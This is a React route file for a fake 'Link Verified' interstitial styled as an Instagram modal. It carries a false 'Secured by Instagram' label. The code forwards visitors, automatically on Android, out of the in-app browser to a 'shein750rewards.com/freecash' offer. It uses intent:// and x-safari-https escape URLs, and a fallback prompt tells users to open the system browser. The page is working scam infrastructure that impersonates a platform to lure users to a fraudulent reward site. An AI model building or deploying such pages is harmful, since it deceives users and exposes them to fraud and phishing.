import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Link Verified" },
      { name: "description", content: "Link verification interstitial." },
    ],
    links: [],
  }),
  component: Index,
});

const LANDING_DOMAIN = "https://shein750rewards.com";
const DEFAULT_PAGE = "/freecash/";

function buildUrls() {
  const params = new URLSearchParams(window.location.search);
  const dest = params.get("dest") || DEFAULT_PAGE;
  params.delete("dest");
  const queryStr = params.toString();
  const separator = dest.includes("?") ? "&" : "?";

  const finalUrl = `${LANDING_DOMAIN}${dest}${queryStr ? separator + queryStr : ""}`;
  const urlWithoutProtocol = finalUrl.replace(/^https?:\/\//, "");

  const userAgent =
    navigator.userAgent ||
    navigator.vendor ||
    (window as unknown as { opera?: string }).opera ||
    "";
  const isAndroid = /android/i.test(userAgent);

  let escapeUrl = "";
  if (isAndroid) {
    const encodedFallback = encodeURIComponent(finalUrl);
    escapeUrl = `intent://${urlWithoutProtocol}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${encodedFallback};end;`;
  } else {
    escapeUrl = `x-safari-https://${urlWithoutProtocol}`;
  }

  return { finalUrl, escapeUrl, isAndroid };
}

function Index() {
  useEffect(() => {
    const urls = buildUrls();
    const btn = document.getElementById("continue-btn") as HTMLButtonElement | null;
    if (!btn) return;

    if (urls.isAndroid) {
      btn.innerText = "Routing...";
      setTimeout(() => {
        window.location.href = urls.escapeUrl;
      }, 100);
    }

    const onClick = () => {
      btn.innerText = "Opening...";
      btn.style.opacity = "0.8";

      setTimeout(() => {
        window.location.href = urls.escapeUrl;

        setTimeout(() => {
          if (!document.hidden) {
            const fb = document.getElementById("fallback-ui");
            if (fb) fb.style.display = "block";
            btn.style.display = "none";
          }
        }, 1500);
      }, 100);
    };

    btn.addEventListener("click", onClick);
    return () => btn.removeEventListener("click", onClick);
  }, []);

  const instagramFont =
    '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';

  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        width: "100vw",
        height: "100vh",
        background:
          "radial-gradient(ellipse at top, #1a1a1a 0%, #000000 60%)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        fontFamily: instagramFont,
        margin: 0,
        padding: 0,
        WebkitFontSmoothing: "antialiased",
      }}
    >
      {/* subtle backdrop dim like Instagram's modal scrim */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          background: "rgba(0,0,0,0.6)",
          backdropFilter: "blur(6px)",
          WebkitBackdropFilter: "blur(6px)",
        }}
      />

      <div
        style={{
          position: "relative",
          backgroundColor: "#262626",
          width: "85%",
          maxWidth: "340px",
          borderRadius: "16px",
          boxShadow:
            "0 10px 30px rgba(0,0,0,0.5), 0 0 0 0.5px rgba(255,255,255,0.06) inset",
          padding: "24px 20px 20px",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          textAlign: "center",
          boxSizing: "border-box",
        }}
      >
        {/* Instagram gradient ring around checkmark */}
        <div
          style={{
            width: "56px",
            height: "56px",
            borderRadius: "50%",
            background:
              "conic-gradient(from 45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5, #feda75)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            marginBottom: "12px",
            padding: "2px",
            boxSizing: "border-box",
          }}
        >
          <div
            style={{
              width: "100%",
              height: "100%",
              borderRadius: "50%",
              backgroundColor: "#262626",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              width="26"
              height="26"
            >
              <defs>
                <linearGradient
                  id="checkGradient"
                  x1="0%"
                  y1="0%"
                  x2="100%"
                  y2="100%"
                >
                  <stop offset="0%" stopColor="#feda75" />
                  <stop offset="25%" stopColor="#fa7e1e" />
                  <stop offset="50%" stopColor="#d62976" />
                  <stop offset="75%" stopColor="#962fbf" />
                  <stop offset="100%" stopColor="#4f5bd5" />
                </linearGradient>
              </defs>
              <path
                fill="url(#checkGradient)"
                d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"
              />
            </svg>
          </div>
        </div>

        <h2
          style={{
            color: "#F5F5F5",
            fontSize: "18px",
            fontWeight: 600,
            letterSpacing: "-0.3px",
            margin: "0 0 8px 0",
            fontFamily: instagramFont,
          }}
        >
          Link Verified
        </h2>

        <p
          style={{
            color: "#A8A8A8",
            fontSize: "14px",
            fontWeight: 400,
            letterSpacing: "-0.1px",
            lineHeight: 1.4,
            margin: "0 0 18px 0",
            padding: "0 6px",
            fontFamily: instagramFont,
          }}
        >
          Please continue to your system browser to view this offer securely.
        </p>

        <button
          id="continue-btn"
          style={{
            width: "100%",
            background:
              "linear-gradient(180deg, #0095F6 0%, #0084d8 100%)",
            color: "#FFFFFF",
            fontWeight: 600,
            fontSize: "15px",
            padding: "12px 14px",
            borderRadius: "10px",
            border: "none",
            outline: "none",
            cursor: "pointer",
            fontFamily: instagramFont,
            letterSpacing: "0.1px",
            boxShadow: "0 1px 0 rgba(255,255,255,0.08) inset",
            WebkitTapHighlightColor: "transparent",
            WebkitAppearance: "none",
            appearance: "none",
          }}
        >
          Continue to Browser
        </button>

        <div
          style={{
            marginTop: "15px",
            fontSize: "12px",
            color: "#555555",
            letterSpacing: "0.2px",
            fontFamily: instagramFont,
          }}
        >
          Secured by Instagram
        </div>

        <div
          id="fallback-ui"
          style={{
            display: "none",
            color: "#ff4d4d",
            fontSize: "13px",
            marginTop: "14px",
            lineHeight: 1.4,
            fontFamily: instagramFont,
          }}
        >
          Action required: Tap ••• (top right) and select "Open in System
          Browser".
        </div>
      </div>
    </div>
  );
}
